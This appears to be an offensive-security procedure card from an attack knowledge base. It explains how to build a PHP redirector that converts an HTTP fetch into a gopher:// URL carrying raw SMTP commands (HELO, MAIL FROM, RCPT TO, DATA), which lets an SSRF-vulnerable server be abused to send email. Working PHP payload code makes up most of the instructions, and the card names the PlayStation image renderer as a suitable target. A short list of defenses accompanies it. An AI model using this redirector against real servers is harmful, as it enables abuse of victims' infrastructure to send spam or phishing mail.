---
tags:
  - ssrf
  - gopher
  - smtp
  - php
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/smtp-helo-test-org]]'
  - '[[commands/smtp-mail-from-tester]]'
  - '[[commands/smtp-rcpt-to-bitbucket]]'
  - '[[commands/smtp-data-start]]'
  - '[[commands/smtp-email-body-test-mail]]'
  - '[[commands/smtp-end-data-dot]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.611Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 6ff16e47-c7db-40b5-bd61-56174848fcd7
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-PHP-Gopher-Redirector-for-SMTP-Commands

## Summary

This procedure creates a PHP redirector script on an attacker-controlled server that encodes SMTP commands into a Gopher URL payload, enabling SSRF exploitation to send emails from a vulnerable server.

## Description

In an SSRF attack scenario targeting endpoints that fetch external images or resources without validation, this procedure sets up a server-side redirect using PHP to transition from HTTP to the Gopher protocol. The Gopher URL crafts raw SMTP commands to interact with an SMTP server on port 25, tricking the vulnerable server into sending an email. This is particularly effective against services like the PlayStation image renderer that follow redirects but fail to block non-HTTP protocols. Prerequisites include a PHP-enabled web server under attacker control and a test SMTP server for verification.

## Requirements

1. Attacker-controlled web server with PHP support (e.g., Apache with mod_php)
2. Access to a test SMTP server on port 25 (e.g., test.smtp.org)
3. Basic knowledge of SMTP protocol and URL encoding
4. No special credentials for the target, but public access to the vulnerable endpoint

## Defense

Defensive measures and detection strategies:

- Implement URL allowlisting in resource-fetching endpoints to restrict to trusted domains
- Disable redirect following or block non-HTTP protocols like Gopher in server configurations
- Monitor outbound connections from servers to unusual ports (e.g., 25) and log SMTP interactions
- Use web application firewalls (WAF) to detect suspicious URL parameters containing encoded payloads

## Objectives

1. Construct a functional PHP redirector that delivers a Gopher SMTP payload
2. Enable chainable exploitation in SSRF scenarios for server abuse
3. Demonstrate email sending capability from the victim's infrastructure

## Instructions

### Step 1: Define SMTP Payload Array

**Context**: Assemble the SMTP commands into an array for encoding with %0A (URL-encoded newline) to form a valid Gopher payload.

**Command** ([[commands/smtp-helo-test-org]]):
```php
$smtp_commands = [
    'HELO test.org',
    'MAIL FROM: <aaaaaaaaaaa@tester.com>',
    'RCPT TO: <bit-bucket@test.smtp.org>',
    'DATA',
    'Test mail',
    '.'
];
```

> This array includes greeting, sender, recipient, data start, body, and end. Expected output: Array ready for implosion.

### Step 2: Implode and Redirect

**Context**: Join the commands with %0A and issue an HTTP header redirect to the Gopher URL.

**Command** (Custom PHP):
```php
$payload = implode('%0A', $smtp_commands);
header('Location: gopher://test.smtp.org:25/_' . $payload);
?>
```

> Save as gopher3.php. When fetched via HTTP, it redirects to Gopher, sending the raw SMTP commands. Expected output: 302 redirect response.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/smtp-helo-test-org]]
- [[commands/smtp-mail-from-tester]]
- [[commands/smtp-rcpt-to-bitbucket]]
- [[commands/smtp-data-start]]
- [[commands/smtp-email-body-test-mail]]
- [[commands/smtp-end-data-dot]]

## Tools Used


## Tags

- ssrf
- gopher
- smtp
- php
